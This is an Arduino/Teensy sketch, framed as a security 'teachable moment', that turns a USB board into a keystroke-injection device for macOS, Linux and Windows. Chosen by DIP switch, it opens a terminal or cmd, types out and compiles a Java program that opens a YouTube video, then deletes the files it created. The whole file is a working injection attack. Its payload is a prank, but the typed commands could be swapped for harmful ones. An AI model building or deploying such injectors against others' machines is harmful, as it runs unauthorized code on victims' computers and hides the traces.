/* 
Teachable Moment via USB Devices
Licensed under GPL v2
(c) 2015 Filip Lueneberg
*/
unsigned int dip1 = 12;
unsigned int dip2 = 11;
unsigned int dip3 = 10;
unsigned int dip4 = 9;

String javaProgramm = "echo -e \"import java.awt.Desktop;\\nimport java.io.IOException;\\nimport java.net.URI;\\nimport java.net.URISyntaxException;\\npublic class AllYourBaseAreBelongToUs{\\n\\npublic static void main (String[] args) throws IOException, URISyntaxException{\\nDesktop.getDesktop().browse(new URI(\\\"https://www.youtube.com/watch?v=rfMC2aVhYuo\\\"));\\n}\\n}\" > AllYourBaseAreBelongToUs.java";


void initDip(void) {
  pinMode(dip1, INPUT_PULLUP);
  pinMode(dip2, INPUT_PULLUP);
  pinMode(dip3, INPUT_PULLUP);
  pinMode(dip4, INPUT_PULLUP);
}

void setup() {
  Serial.begin(9600);
  //initDip();
  pinMode(4, INPUT_PULLUP);
  pinMode(10, INPUT_PULLUP);
  delay(1000);
}

void loop() {
  // put your main code here, to run repeatedly:
  if (!digitalReadFast(dip4)) {
    // mac-app start
    Keyboard.set_modifier(MODIFIERKEY_GUI);
    Keyboard.set_key1(KEY_SPACE);
    Keyboard.send_now();
    delay(100);

    // release all the keys at the same instant
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);

    Keyboard.print("terminal");
    delay(100);

    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);

    Keyboard.print("cd Desktop");
    delay(100);

    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.print(javaProgramm);
    delay(100);

    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.print("javac AllYourBaseAreBelongToUs.java");
    delay(100);

    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.print("java AllYourBaseAreBelongToUs");
    delay(100);

    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(5000);

    Keyboard.set_modifier(MODIFIERKEY_GUI);
    Keyboard.set_key1(KEY_TAB);
    Keyboard.send_now();
    delay(100);

    // release all the keys at the same instant
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.print("rm AllYourBaseAreBelongToUs.java");
    delay(100);

    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.print("rm AllYourBaseAreBelongToUs.class");
    delay(100);

    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.set_modifier(MODIFIERKEY_GUI);
    Keyboard.set_key1(KEY_Q);
    Keyboard.send_now();
    delay(100);

    // release all the keys at the same instant
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
    
    
  }

  if (!digitalReadFast(dip2)) {
    //Linux
    Keyboard.set_modifier(MODIFIERKEY_ALT);
    Keyboard.set_key1(KEY_F2);
    Keyboard.send_now();
    delay(100);

    // release all the keys at the same instant
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);

    Keyboard.print("gnome-terminal");
    delay(100);

    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(500);

    Keyboard.print("cd Desktop");
    delay(100);

    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.print(javaProgramm);
    delay(100);

    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.print("javac AllYourBaseAreBelongToUs.java");
    delay(100);

    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.print("java AllYourBaseAreBelongToUs");
    delay(100);

    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(2000);
    
    Keyboard.set_modifier(MODIFIERKEY_ALT);
    Keyboard.set_key1(KEY_TAB);
    Keyboard.send_now();
    delay(100);

    // release all the keys at the same instant
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.print("rm AllYourBaseAreBelongToUs.java");
    delay(100);

    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.print("rm AllYourBaseAreBelongToUs.class");
    delay(100);

    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.print("exit");
    delay(100);

    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
  }

  if (!digitalReadFast(dip1)) {
    //windows
    delay(1000);
    Keyboard.set_modifier(MODIFIERKEY_GUI);
    Keyboard.set_key1(KEY_R);
    Keyboard.send_now();
    delay(100);

    // release all the keys at the same instant
    Keyboard.set_modifier(0);
    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);

    //open cmdcmd
    Keyboard.print("cmd");
    delay(100);
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.print("cd Desktop");
    delay(100);
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);

    //whoami
    Keyboard.print("echo import java.awt.Desktop; > AllYourBaseAreBelongToUs.java");
    delay(100);
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.print("echo import java.io.IOException; >> AllYourBaseAreBelongToUs.java");
    delay(100);
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.print("echo import java.net.URI; >> AllYourBaseAreBelongToUs.java");
    delay(100);
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.print("echo import java.net.URISyntaxException; >> AllYourBaseAreBelongToUs.java");
    delay(100);
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.print("echo public class AllYourBaseAreBelongToUs{ >> AllYourBaseAreBelongToUs.java");
    delay(100);
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.print("echo public static void main (String[] args) throws IOException, URISyntaxException{ >> AllYourBaseAreBelongToUs.java");
    delay(100);
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.print("echo Desktop.getDesktop().browse(new URI(\"https://www.youtube.com/watch?v=rfMC2aVhYuo\")); >> AllYourBaseAreBelongToUs.java");
    delay(100);
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.print("echo } >> AllYourBaseAreBelongToUs.java");
    delay(100);
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.print("echo } >> AllYourBaseAreBelongToUs.java");
    delay(100);
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.print("javac AllYourBaseAreBelongToUs.java");
    delay(100);
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
    
    Keyboard.print("java AllYourBaseAreBelongToUs");
    delay(100);
    Keyboard.set_key1(KEY_ENTER);
    Keyboard.send_now();
    delay(100);

    Keyboard.set_key1(0);
    Keyboard.send_now();
    delay(100);
  }
  // typing too rapidly can overwhelm a PC
  delay(50000);
}
